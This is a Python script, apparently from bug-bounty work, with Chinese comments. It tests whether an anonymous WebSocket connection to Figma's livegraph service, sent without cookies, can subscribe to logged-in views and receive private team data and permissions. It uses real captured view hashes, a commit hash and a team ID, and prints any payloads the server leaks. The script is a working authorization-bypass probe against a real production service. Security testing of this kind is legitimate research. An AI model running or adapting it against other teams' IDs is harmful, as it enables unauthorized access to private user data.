"""Figma livegraph WS 越权测试：匿名连接订阅登录态视图
参数全部来自真实捕获（ws_url_anon.txt / ws_url_fresh.txt / anon_capture2.json）
测试：匿名(无cookie)订阅 FileBrowserSidebarData / CurrentTeamCombinedPermissions，
      对比服务端是否返回团队私有数据
"""
import json, sys, time, urllib.parse
import websocket

sys.stdout.reconfigure(encoding="utf-8", errors="replace")

WS_URL_ANON = open(r"D:\scan\_figma_hunt\ws_url_anon.txt").read().strip()
TEAM_ID = "1666382706663462213"  # 测试账号自己的团队（确定性来源：ws_url_fresh.txt）
HASH_SIDEBAR = "19ed18eb5eb008405731df268690983f08e7e9c314cb5d8b09b48da403b3548c"
HASH_PERMS = "f25ed3eceb859f73d4484895786b72fcf082f473c83967f96136f7fa8d0f05b4"
COMMIT = "5848603c50c1ee154ea6a1fe5ee3aab3791c5b48"

AUTH_MSG = {
    "messageType": "auth", "clientType": "web",
    "args": {"userId": None, "anonymousUserId": None},
    "tags": {"clientType": "web", "commitHash": COMMIT,
             "clientUrl": "https://www.figma.com/file/bv2nMIdFf4u3dESGail4sm"},
    "clientRequestedVersion": 2,
}


def subscribe(view_name, view_hash, args):
    return {"messageType": "subscribe", "viewName": view_name,
            "viewHash": view_hash, "loadType": "initial", "args": args}


def run_test(name, sub_msgs, wait=8):
    print(f"\n===== 测试: {name} =====")
    ws = websocket.create_connection(WS_URL_ANON, timeout=20,
                                     origin="https://www.figma.com",
                                     header=["User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/149.0.0.0 Safari/537.36"])
    ws.send(json.dumps(AUTH_MSG))
    time.sleep(2)
    for m in sub_msgs:
        ws.send(json.dumps(m))
        print("SENT:", m["viewName"], json.dumps(m["args"], ensure_ascii=False)[:120])

    results = []
    end = time.time() + wait
    while time.time() < end:
        try:
            ws.settimeout(min(3, end - time.time()))
            opcode, data = ws.recv_data()
            if opcode == 0x1:  # text
                try:
                    msg = json.loads(data)
                except Exception:
                    continue
                mt = msg.get("messageType", "?")
                if mt == "authSuccess":
                    print("  authSuccess:", msg.get("userId"))
                elif mt == "denormalizedPendingMutations":
                    for key in msg.get("mutations", {}):
                        if name.split("|")[0] in key:
                            results.append(key)
                            payload = json.dumps(msg["mutations"][key], ensure_ascii=False)
                            print(f"  [HIT] 数据推送: {key[:150]}")
                            print(f"        payload: {payload[:600]}")
                elif mt == "viewLoaded":
                    print("  viewLoaded:", msg.get("viewName"))
                elif mt == "error":
                    print("  [ERR]", json.dumps(msg, ensure_ascii=False)[:200])
                else:
                    print("  msg:", mt, str(data)[:120])
        except Exception as e:
            break
    ws.close()
    return results


if __name__ == "__main__":
    t1 = run_test("FileBrowserSidebarData", [
        subscribe("FileBrowserSidebarData", HASH_SIDEBAR,
                  {"currentOrgId": None, "currentTeamId": TEAM_ID}),
    ])
    t2 = run_test("CurrentTeamCombinedPermissions", [
        subscribe("CurrentTeamCombinedPermissions", HASH_PERMS,
                  {"teamId": TEAM_ID}),
    ])
    print("\n===== 结果 =====")
    print("FileBrowserSidebarData 命中:", len(t1), "条")
    print("CurrentTeamCombinedPermissions 命中:", len(t2), "条")
